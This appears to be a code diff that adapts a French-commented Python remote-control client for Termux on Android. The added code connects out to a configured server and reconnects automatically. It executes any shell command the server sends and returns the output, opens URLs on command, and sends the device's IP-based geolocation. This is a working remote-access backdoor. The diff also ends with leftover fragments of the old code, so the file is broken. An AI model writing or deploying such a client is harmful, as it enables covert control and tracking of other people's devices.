@@ -1,10 +1,8 @@
 import subprocess
-import ctypes
 import webbrowser
 import requests
 import os
 import socket as sock
-import pyttsx3
 import sys
 import time
 import platform
@@ -28,12 +26,94 @@ def get_local_ip():
     return local_ip
 
 def show_popup(message):
-    """Affiche une popup selon le système d'exploitation."""
-    system = platform.system()
+    """Affiche un message dans le terminal (Termux n'a pas de GUI)."""
+    print(f"\n[POPUP] {message}\n")
+    return "Message affiche dans le terminal"
+
+def open_browser(url):
+    """Ouvre une URL dans le navigateur par défaut."""
     try:
-        if system == "Windows":
-            ctypes.windll.user32.MessageBoxW(0, message, "Message", 0x40)
-        else:
+        webbrowser.open(url)
+        return "Navigateur ouvert"
+    except Exception as e:
+        return f"Erreur navigateur: {str(e)}"
+
+def get_location():
+    """Récupère la localisation via ipinfo.io."""
+    try:
+        r = requests.get('https://ipinfo.io/json', timeout=5).text
+        return r
+    except Exception:
+        return "Erreur localisation"
+
+def run_command(cmd):
+    """Exécute une commande shell et retourne la sortie."""
+    try:
+        out = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
+        return out.decode('utf-8', errors='ignore') if out else "OK"
+    except Exception as e:
+        return str(e)
+
+def main():
+    """Fonction principale du client Termux."""
+    print(f"[*] Client Termux actif. Connexion vers {HOST}:{PORT}...")
+
+    while True:  # Boucle de reconnexion automatique
+        try:
+            with sock.socket(sock.AF_INET, sock.SOCK_STREAM) as s:
+                s.connect((HOST, PORT))
+                s.sendall(f"Connecte: {platform.system()} ({get_local_ip()})".encode('utf-8'))
+
+                while True:
+                    command = s.recv(BUFFER_SIZE).decode('utf-8', errors='ignore')
+                    if not command:
+                        break
+
+                    print(f"[RECU] Commande : {command}")
+
+                    if command.startswith("popup:"):
+                        threading.Thread(target=show_popup, args=(command[6:],)).start()
+                        s.sendall("OK: Popup affichee".encode('utf-8'))
+
+                    elif command.startswith("browser:"):
+                        webbrowser.open(command[8:])
+                        s.sendall("OK: Navigateur ouvert".encode('utf-8'))
+
+                    elif command == "location":
+                        try:
+                            r = requests.get('https://ipinfo.io/json', timeout=5).text
+                            s.sendall(r.encode('utf-8'))
+                        except Exception:
+                            s.sendall("Erreur localisation".encode('utf-8'))
+
+                    elif command.startswith("cmd:"):
+                        try:
+                            out = subprocess.check_output(command[4:], shell=True, stderr=subprocess.STDOUT)
+                            s.sendall(out if out else b"OK")
+                        except Exception as e:
+                            s.sendall(str(e).encode('utf-8'))
+
+                    elif command == "lock":
+                        s.sendall("Fonctionnalite desactivee (Termux)".encode('utf-8'))
+
+                    elif command.startswith("speak:"):
+                        s.sendall("Fonctionnalite desactivee (Termux)".encode('utf-8'))
+
+                    elif command == "screenshot":
+                        s.sendall("Fonctionnalite desactivee (Termux)".encode('utf-8'))
+
+                    elif command == "exit":
+                        print("[INFO] Deconnexion demandee.")
+                        return
+
+        except ConnectionRefusedError:
+            print("[ERREUR] Impossible de se connecter au serveur. Reessai dans 5 secondes...")
+        except Exception as e:
+            print(f"[ERREUR] {str(e)}")
+        time.sleep(5)
+
+if __name__ == "__main__":
+    main()
             try:
                 subprocess.run(['notify-send', 'Message', message], check=True)
             except subprocess.CalledProcessError:
